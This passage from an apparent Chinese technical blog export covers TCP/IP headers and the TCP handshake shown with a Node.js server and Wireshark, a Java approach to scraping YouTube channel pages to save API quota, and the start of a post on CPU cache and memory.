总长度，该字段用以指示整个IP数据包的长度，最长为65535字节，包括头和数据。</p><p>Identification - 标识符，唯一标识主机发送的每一份数据报。</p><p>Flags - 标志。分为3个字段，依次为保留位、不分片位和更多片位</p><p>Fragment offset - 段偏移量。该分片相对于原始数据报开始处位置的偏移量。</p><p>TTL(Time to Live生存时间) - 该字段用于表示IP数据包的生命周期，可以防止一个数据包在网络中无限循环地发下去。TTL的意思是一个数据包在被丢弃之前在网络中的最大周转时间。该数据包经过的每一个路由器都会检查该字段中的值，当TTL的值为0时此数据包会被丢弃。TTL对应于一个数据包通过路由器的数目，一个数据包每经过一个路由器，TTL将减去1。</p><p>Protocol - 协议号。用以指示IP数据包中封装的是哪个协议。</p><p>Header checksum - 首部校验和。检验和是16位的错误检测字段。目的主机和网络中的每个网关都要重新计算报头的校验和，如果一样表示没有改动过。</p><p>Source - 源IP地址。该字段用于表示数据包的源地址，指的是发送该数据包的设备的网络地址。</p><p>Destination - 目标IP地址。该字段用于表示数据包的目标的地址，指的是接收节点的网络地址。</p></blockquote><h2 id="6-传输层"><a href="#6-传输层" class="headerlink" title="6 传输层"></a>6 传输层</h2><p>传输层是面向连接的、可靠的的进程到进程通信的协议。TCP提供全双工服务，即数据可在同一时间双向传播。TCP将若干个字节构成一个分组，此分组称为报文段(Segment)。提供了一种端到端的连接。</p><p>传输层的协议主要有TCP 和 UDP，TCP(Transimision Control Protocal)是一种可靠的、面向连接的协议，传输效率低。UDP(User Datagram Protocal)是一种不可靠的、无连接的服务，传输效率高。<br>下面重点介绍一下TCP的三次握手和四次挥手。</p><h2 id="1-TCP的功能"><a href="#1-TCP的功能" class="headerlink" title="1) TCP的功能"></a>1) TCP的功能</h2><p>TCP主要是将数据进行分段打包传输，对每个数据包编号控制顺序，运输中丢失、重发和丢弃处理。</p><h2 id="2-TCP头的介绍"><a href="#2-TCP头的介绍" class="headerlink" title="2) TCP头的介绍"></a>2) TCP头的介绍</h2><p>有点和IP头类似，我们先来张图看下：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-8caac8f1477e7e0848743f8a9c1d91ba_hd.jpg" alt="img"></p><blockquote><p>Source Port &amp; Destination Port - 源端口号和目标端口号;计算机通过端口号识别访问哪个服务,比如http服务或ftp服务;发送方端口号是进行随机端口;目标端口号决定了接收方哪个程序来接收。</p><p>Sequence number - 32位序列号，TCP用序列号对数据包进行标记，以便在到达目的地后重新重装。在建立连接时通常由计算机生成一个随机数作为序列号的初始值。</p><p>Acknowledgment number - 32位确认号，确认应答号。发送端接收到这个确认应答后，可以认为这个位置以前所有的数据都已被正常接收。</p><p>Header Length - 首部长度。单位是 ‘4’个’字节’，如果没有可选字段，那么这里的值就是 5。表示 TCP 首部的长度为 20 字节。</p><p>checksum - 16位校验和。用来做差错控制，TCP校验和的计算包括TCP首部、数据和其它填充字节。</p><p>flags - 控制位。TCP的连接、传输和断开都受这六个控制位的指挥</p><p>window size - 本地可接收数据的数目，这个值的大小是可变的。当网络通畅时将这个窗口值变大加快传输速度，当网络不稳定时减少这个值可以保证网络数据的可靠传输。它是来在TCP传输中进行流量控制的</p></blockquote><h2 id="3-传说中的三次握手和四次挥手（抓包演示）"><a href="#3-传说中的三次握手和四次挥手（抓包演示）" class="headerlink" title="3) 传说中的三次握手和四次挥手（抓包演示）"></a>3) 传说中的三次握手和四次挥手（抓包演示）</h2><p>三次握手和四次挥手到底是怎么回事呢，我用一台主机A（172.16.50.72:65076）起一个服务，另外一台主机B（172.16.17.94:8080）请求一下。<br>在A主机上启动node服务：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123;pathname, querry&#125; = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">let</span> result = [];</span><br><span class="line">    req.on(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        result.push(data);</span><br><span class="line">    &#125;)</span><br><span class="line">    req.on(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(Buffer.concat(result).toString());</span><br><span class="line">        res.end(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;server started&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>B主机连接A并发送数据：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d &quot;user&quot;:&quot;lucy&quot; 172.16.17.94:8080</span><br></pre></td></tr></table></figure><p>用wireshark抓包演示一下。如下图：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-ae1b0c298e03963eab3fc23847a6ef20_hd.jpg" alt="img"></p><p>上图中A为三次握手，B为数据传输，C为四次挥手。下面我们详细介绍一下这三个部分。</p><p>首先我们先图解一下wireshark抓到的数据，如下图：</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-4d7cd156319c914e115b19ee15e70063_hd.jpg" alt="img"></p><p>我们把这个过程分为三部分，第一部分为三次握手建立连接，第二部分为数据传输，第三次为四次挥手断开连接。</p><p>三次握手</p><p>我们分析一下三次握手的过程（包括ack 和 seq的值变化）。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-b93fef4ca387c4aa50071dad72fc2085_hd.jpg" alt="img"></p><p>为了方便描述我们将主动发起请求的172.16.17.94:8080 主机称为客户端，将返回数据的主机172.16.17.94:8080称为服务器，以下也是。</p><ul><li>第一次握手: 建立连接。客户端发送连接请求，发送SYN报文，将seq设置为0。然后，客户端进入SYN_SEND状态，等待服务器的确认。</li><li>第二次握手: 服务器收到客户端的SYN报文段。需要对这个SYN报文段进行确认，发送ACK报文，将ack设置为1。同时，自己还要发送SYN请求信息，将seq为0。服务器端将上述所有信息一并发送给客户端，此时服务器进入SYN_RECV状态。</li><li>第三次握手: 客户端收到服务器的ACK和SYN报文后，进行确认，然后将ack设置为1，seq设置为1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</li></ul><blockquote><p>数据传输</p></blockquote><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-325456c5c7054ee6b29795a684cbbffb_hd.jpg" alt="img"></p><ul><li>客户端先向服务器发送数据，该数据报是lenth为159的数据。</li><li>服务器收到报文后, 也向客户端发送了一个数据进行确认（ACK），并且返回客户端要请求的数据，数据的长度为111，将seq设置为1，ack设置为160（1 + 159）。</li><li>客户端收到服务器返回的数据后进行确认（ACK），将seq设置为160， ack设置为112（1 + 111）。</li></ul><blockquote><p>四次挥手</p></blockquote><p>当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，就要断开TCP连接了，就有了神秘的“四次挥手”。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-6704e393bd622132d3dac3773412ec26_hd.jpg" alt="img"></p><ul><li>第一次挥手：客户端向服务器发送一个FIN报文段，将设置seq为160和ack为112，;此时，客户端进入 <strong>FIN_WAIT_1</strong>状态,这表示客户端没有数据要发送服务器了，请求关闭连接;</li><li>第二次挥手：服务器收到了客户端发送的FIN报文段，向客户端回一个ACK报文段，ack设置为1，seq设置为112;服务器进入了<strong>CLOSE_WAIT</strong>状态，客户端收到服务器返回的ACK报文后，进入<strong>FIN_WAIT_2</strong>状态;</li><li>第三次挥手：服务器会观察自己是否还有数据没有发送给客户端，如果有，先把数据发送给客户端，再发送FIN报文；如果没有，那么服务器直接发送FIN报文给客户端。请求关闭连接，同时服务器进入<strong>LAST_ACK</strong>状态;</li><li>第四次挥手：客户端收到服务器发送的FIN报文段，向服务器发送ACK报文段，将seq设置为161，将ack设置为113，然后客户端进入<strong>TIME_WAIT</strong>状态;服务器收到客户端的ACK报文段以后，就关闭连接;此时，客户端等待2MSL后依然没有收到回复，则证明Server端已正常关闭，客户端也可以关闭连接了。</li></ul><p>注意：在握手和挥手时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度。</p><h2 id="7-应用层"><a href="#7-应用层" class="headerlink" title="7 应用层"></a>7 应用层</h2><p>应用层常见协议有HTTP、HTTPS 、FTP 、SMTP等。</p><p>TCP/IP模型我们基本介绍完了，那层与层之间是怎样合作和分工的呢，我们用两张图介绍一下：<br>发送方的数据是从上往下传输的，即从应用层向物理层传输。接收方的数据是从下往上传输的，即从物理层向应用层传输。如下两张图。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-fddf614d20e94c08a02861297fb95a99_hd.jpg" alt="img"></p><p>发送方是从高层到低层封装数据：</p><ul><li>在应用层要把各式各样的数据如字母、数字、汉字、图片等转换成二进制</li><li>在TCP传输层中，上层的数据被分割成小的数据段，并为每个分段后的数据封装TCP报文头部</li><li>在TCP头部有一个关键的字段信息端口号，它用于标识上层的协议或应用程序，确保上层数据的正常通信</li><li>计算机可以多进程并发运行，例如在发邮件的同时也可以通过浏览器浏览网页，这两种应用通过端口号进行区分</li><li>在网络层，上层数据被封装上亲的报文头部(IP头部)，上层的数据是包括TCP头部的。IP地址包括的最关键字段信息就是IP地址，用于标识网络的逻辑地址。</li><li>数据链路径层，上层数据成一个MAC头部，内部有最关键的是MAC地址。MAC地址就是固化在硬件设备内部的全球唯一的物理地址。</li><li>在物理层，无论在之前哪一层封装的报文头和还是上层数据都是由二进制组成的，物理将这些二进制数字比特流转换成电信号在网络中传输</li></ul><p><img src="https://mysticalyu.gitee.io/pic/hexo/v2-1ede5aa9c734a98c0d9c259cd92308fe_hd.jpg" alt="img"></p><p>接收方是从低层到高层解封装</p><ul><li>数据封装完毕传输到接收方后，将数据要进行解封装</li><li>在物理层，先把电信号转成二进制数据，并将数据传送至数据链路层</li><li>在数据链路层，把MAC头部拆掉，并将剩余的数据传送至上一层</li><li>在网络层，数据的IP头部被拆掉，并将剩余的数据送至上一层</li><li>在传输层，把TCP头部拆掉，将真实的数据传送至应用层</li></ul><p><strong>我严重怀疑你在拖文章长度</strong></p><p> <img src="https://mysticalyu.gitee.io/pic/hexo/ganga.jpeg" alt="尴尬表情包"> </p>]]></content>
      
      
      <categories>
          
          <category> 网络是怎么连接的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在YouTube Api限额的情况下获取更多视频</title>
      <link href="/YouTube/"/>
      <url>/YouTube/</url>
      
        <content type="html"><![CDATA[<p>如何在YouTube Api限额的情况下获取更多视频</p><a id="more"></a><h1 id="YouTube视频"><a href="#YouTube视频" class="headerlink" title="YouTube视频"></a>YouTube视频</h1><p>谷歌限制了YouTube api v3的请求量，一天10000配额，这里不是10000次请求，每次请求根据不同参数消耗不同配额。为了摆脱这种限制而获得更多的新发布视频，做了以下内容的方案。</p><h2 id="需求："><a href="#需求：" class="headerlink" title="需求："></a>需求：</h2><p>运营配置YouTube的channelId，后台需要根据这些channelId去获取最近发布的可以在小屏播放的video信息，以增加用户活度。</p><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>YouTube限额问题，谷歌限制域名只能使用一个ApiKey，配置多会被封禁，按照现有全部用api检索会导致频道越配越多，获得的视频越来越少。</p><h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>出于问题中关键点，系统不知道channel下面发布的情况，只能被动查询，这样可能会导致查询消耗了配置结果返回为空或者很少视频的情况；所以考虑使用订阅模式去事先得知频道的情况。</p><p>查找了很多资料；最坑的竟然是YouTube api官网给的方法。。。。(<a href="https://developers.google.com/youtube/v3/getting-started">youtubeApi</a>)。我试着去使用它介绍的发布订阅，对于Google的集线器我研究了很久，毕竟不熟悉，而且没有相关的java实现。</p><h3 id="方式1："><a href="#方式1：" class="headerlink" title="方式1："></a>方式1：</h3><p>1.启动自己的回调服务器，随便弄个可以外网访问的服务返回200和请求参数中的hub_chanlenge即可。</p><p>2.订阅你需要订阅的频道的atom：类似：<a href="https://www.youtube.com/xml/feeds/videos.xml?channel_id=CHANNEL_ID">https://www.youtube.com/xml/feeds/videos.xml?channel_id=CHANNEL_ID</a> 这种。</p><p>3.返回204即成功。</p><h3 id="我的尝试："><a href="#我的尝试：" class="headerlink" title="我的尝试："></a>我的尝试：</h3><p>我使用的自己的云服务器，使用谷歌的集线器，然后去订阅YouTube，发现509等错误，莫名其妙后使用了自己写的atom作为发布方，结果成功了。不过，可笑的是，这个集线器它并不能正常工作，我在修改atom再次发布的时候，它竟然没能好好工作；没向我的回调函数发送信息。我崩溃了，我去谷歌搜索了很多相关问题，发现YouTube已经不将视频信息发布到上面所说的xml中了，而且在这之前YouTube为了用户体验，每个频道只发送3条消息给订阅用户(YouTube自带的那个铃铛订阅)我去你…..</p><h3 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h3><p>再对问题思考，依然摆脱不了需要提前得知频道下视频的发布情况，我试着去YouTube网站videos下查看视频与api返回的视频做对照，发现可以使用解析http的标签获取发布的视频和时间(其实一开始也想过使用爬虫，奈何怕蹲牢啊。。)。我试着使用httpClient解析这个页面，果然得到了我想要的答案。</p><p>这样我就可以提前知道频道的发布情况，进而对使用api检索得到的结果有了大的优化。相关代码如下：</p><p>YouTubeTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YoutubeTest</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String matching = <span class="string">&quot;&lt;/li&gt;&lt;li&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String CONTENT = <span class="string">&quot;class=\&quot;yt-lockup-content\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String GET_VEDIO_INFO_PRE = <span class="string">&quot;https://youtube.com/get_video_info?video_id=&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        http(<span class="string">&quot;UC24_Z2L-8Ki183AI9zJJzNQ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">http</span><span class="params">(String channelId)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;https://www.youtube.com/channel/&quot;</span> + channelId + <span class="string">&quot;/videos&quot;</span>;</span><br><span class="line">        CloseableHttpClient httpclient = HttpClients.createDefault();</span><br><span class="line">        HttpGet httpget = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">        CloseableHttpResponse response = httpclient.execute(httpget);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HttpEntity entity = response.getEntity();</span><br><span class="line">            String responseYoutube = EntityUtils.toString(entity);</span><br><span class="line">            List&lt;String&gt; countList = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">int</span> length = responseYoutube.length();</span><br><span class="line">            <span class="keyword">int</span> i1, i2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                i1 = responseYoutube.indexOf(CONTENT, i);</span><br><span class="line">                <span class="keyword">if</span> (i1 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    i2 = responseYoutube.indexOf(<span class="string">&quot;&lt;/div&gt;&quot;</span>, i1);</span><br><span class="line">                    <span class="keyword">if</span> (i2 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        countList.add(responseYoutube.substring(i1, i2));</span><br><span class="line">                        i = i2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">long</span> endEachTime = System.currentTimeMillis();</span><br><span class="line">            System.out.println(<span class="string">&quot;遍历耗时：&quot;</span> + (endEachTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">            List&lt;VideoInfo&gt; videoInfos = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="number">30</span>);</span><br><span class="line">            countList.forEach((s) -&gt; &#123;</span><br><span class="line">                <span class="keyword">int</span> hrefStart = s.indexOf(<span class="string">&quot;v=&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> hrefEnd = s.indexOf(<span class="string">&quot;\&quot;&quot;</span>, hrefStart);</span><br><span class="line">                VideoInfo videoInfo = <span class="keyword">new</span> VideoInfo();</span><br><span class="line">                <span class="keyword">int</span> lastIndex = s.indexOf(<span class="string">&quot;&lt;/li&gt;&lt;/ul&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (lastIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    String substring = s.substring(s.indexOf(matching) + matching.length(), s.indexOf(<span class="string">&quot;&lt;/li&gt;&lt;/ul&gt;&quot;</span>));</span><br><span class="line">                    <span class="keyword">int</span> time = analysisTime(substring);</span><br><span class="line">                    <span class="keyword">if</span> (time == -<span class="number">2</span>) &#123;</span><br><span class="line">                        System.out.println(channelId + <span class="string">&quot;返回参数中有解析错误的html标签:&quot;</span> + s);</span><br><span class="line">                    &#125;</span><br><span class="line">                    videoInfo.setPublishTime(time);</span><br><span class="line">                    videoInfo.setVideoId(s.substring(hrefStart + <span class="number">2</span>, hrefEnd));</span><br><span class="line">                    System.out.println(substring);</span><br><span class="line">                    videoInfos.add(videoInfo);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            videoInfos.forEach(System.out::println);</span><br><span class="line">            System.out.println(<span class="string">&quot;打印耗时：&quot;</span> + (System.currentTimeMillis() - endEachTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">            System.out.println(countList.size());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            response.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String CH_SECONDS_PRE = <span class="string">&quot;秒前&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String CH_MINUTES_PRE = <span class="string">&quot;分鐘前&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String CH_HOURS_PRE = <span class="string">&quot;小時前&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String CH_DAYS_PRE = <span class="string">&quot;天前&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">analysisTime</span><span class="params">(String substring)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> matches = substring.substring(<span class="number">0</span>, <span class="number">2</span>).trim().matches(<span class="string">&quot;^[0-9]*[1-9][0-9]*$&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> time=-<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(matches)&#123;</span><br><span class="line">            time = Integer.parseInt(substring.substring(<span class="number">0</span>, <span class="number">2</span>).trim());</span><br><span class="line">            <span class="keyword">if</span> (substring.contains(CH_SECONDS_PRE)) &#123;</span><br><span class="line">                time = time + <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (substring.contains(CH_MINUTES_PRE)) &#123;</span><br><span class="line">                time = time + <span class="number">100</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (substring.contains(CH_HOURS_PRE)) &#123;</span><br><span class="line">                time = time + <span class="number">200</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (substring.contains(CH_DAYS_PRE)) &#123;</span><br><span class="line">                time = time + <span class="number">300</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                time = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> time;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>VideoInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VideoInfo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String videoId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> publishTime;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用的是香港，所以这里匹配获取时间的时候使用了繁体，解释下这里面的匹配规则。</p><p><font color=red>class=”yt-lockup-content”</font>是返回的html中视频主题标签的class，从此开始一个个获取。</p><p><font color=red>analysisTime</font> 秒则直接使用，分钟则为100起，以此类推。</p><p>其实在F12调试的时候，这个URL请求获得的是一段json，不知道为什么变成了html，对这方面不是很熟悉，之后会想办法去优化这块。</p><p><font color=red>GET_VEDIO_INFO_PRE</font>这个地址是YouTube的公共API，目前还是可以使用的，可以检索一些视频的信息。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入浅析内存</title>
      <link href="/%E6%B7%B1%E5%85%A5%E6%B5%85%E6%9E%90%E5%86%85%E5%AD%98/"/>
      <url>/%E6%B7%B1%E5%85%A5%E6%B5%85%E6%9E%90%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>最近在看一本&lt;&lt;架构解密：从分布式到微服务&gt;&gt;中看到了有关内存的相关知识，自己这方面比较薄弱，就想着记录下来。书本地址：<a href="http://www.zhihu.com/pub/book/119572875">www.zhihu.com/pub/book/119572875</a></p><a id="more"></a><p>除了CPU，内存大概是最重要的计算资源了。基本称为分布式系统标配的缓存中间件、高性能的数据处理系统及当前流行的大数据平台，都离不开对计算机内存的深入理解与巧妙使用。</p><h2 id="你所不知道的内存知识"><a href="#你所不知道的内存知识" class="headerlink" title="你所不知道的内存知识"></a>你所不知道的内存知识</h2><h3 id="复杂的CPU与单纯的内存"><a href="#复杂的CPU与单纯的内存" class="headerlink" title="复杂的CPU与单纯的内存"></a>复杂的CPU与单纯的内存</h3><p>首先，我们澄清几个容易让人混淆的CPU术语。</p><blockquote><ul><li>Socket或者Processor：指一个屋里CPU芯片，盒装的或者散装的，上面有很多针脚，直接安装在主板上。</li><li>Core：指Socket里封装的一个CPU核心，每个Core都是完全独立的计算单元，我们平时说的4核CPU，就是指一个Socket(Processor)里封装了4个Core。</li><li>HT超线程：目前Intel与AMD的Processor大多支持在一个Core里并行执行两个线程，此时在操作系统看来就相当于两个逻辑CPU(Logical Processor),在大多数情况下，我们在程序里提到CPU这个概念时，就是指一个Logical Processor。</li></ul></blockquote><p>&nbsp; &nbsp; 然后，我们先从第一个非常简单的问题开始：CPU可以直接操作内存吗？可能99%的程序员会不假思索的回答：「肯定的，不然程序怎么跑。」如果理性地分析一下，你会发现这个回答有问题：CPU与内存条是独立的两个硬件，而且CPU上也没有插槽和连线可以让内存条挂上去，也就是说，CPU并不能直接访问内存条，而是要通过主办上的其他硬件(接口)来间接访问内存条。</p><p>&nbsp; &nbsp;第二个问题：CPU的运算速度与内存条的访问速度在回见的差距究竟有多大？这个差距跟王健林「先挣它个一个亿的」小目标和「普通人有车有房」的宏大目标之间的差距相比，是更大还是更小呢？答案是：「差不多」。通常来说，CPU的运算速度与内存访问速度之间的差距不过是100倍，假如有100万RMB就可以有有房(贷)有车(贷)了没那么其100倍就刚好是一亿RMB。</p><p>&nbsp; &nbsp;既然CPU的速度与内存的速度还是存在高度两个数量级的巨大鸿沟，所有它们注定不能「幸福地在一起」，于是CPU的亲密伴侣Cache闪亮登场。与来自DRAM家族的内存(Memory)出身不同，Cache来自ASRAM家族。DRAM与SRAM最简单的区别是后者特别快，容量特别小，电路结构非常复杂，造假特别高。</p><p>&nbsp; &nbsp;造成Cache与内存之间巨大性能差距的主要原因是工作原理和结构不同，如下所述。</p><blockquote><ul><li>DRAM存储一个数据只需要一个电容加一个晶体管，SRAM则需要6个晶体管。由于DRAM的数据其实是保存在电容里的，所以每次读写过程中的充放电环节也导致了DRAM读写数据有一个延迟的问题，这个延迟通常为十几到几十ns。</li><li>内存可以看做一个二维数据，每个存储单元都有其行地址和列地址。<br>由于SRAM的容量很小，所以存储单元的地址(行与列)比较短，可以一次性传输到SRAM中；而DRAM则需要分别传送行与列的地址。</li><li>SRAM的频率基本与CPU的频率保持一致；而DRAM的频率知道DDR4以后才开始接近CPU的频率。</li></ul></blockquote><p>&nbsp; &nbsp;Cache是被集成到CPU内部的一个存储单元，一级Cache(L1 Cache)通常只有32~64KB的容量，这个容量远远不能满足CPU大量、告诉存取的需求。此外，由于存储性能的答复提升往往伴随着价格的同步飙升，所以出于对整体成本的控制，现实中往往采用金字塔形的多级Cache体系来实现最佳缓存效果，于是出现了二级Cache(L2 Cache)及三级Cache(L3 Cache)，每一级Cache都牺牲了部分性能指标来换取更大的容量，目的是缓存更多的热点数据。以Intel家族 Intel Sandy Bridge架构的CPU为例，其L1 Cache容量为64KB，访问速度为1ns左右；L2 Cache容量扩大4倍，达到256KB，访问速度则降低到3ns左右；L3 Cache的容量则扩大512倍，达到32MB，访问速度也下降到12ns左右，即使如此，也比访问驻村的100ns(40ns+65ns)快一个数量级。此外，L3 Cache是被一个Socket上的所有CPU 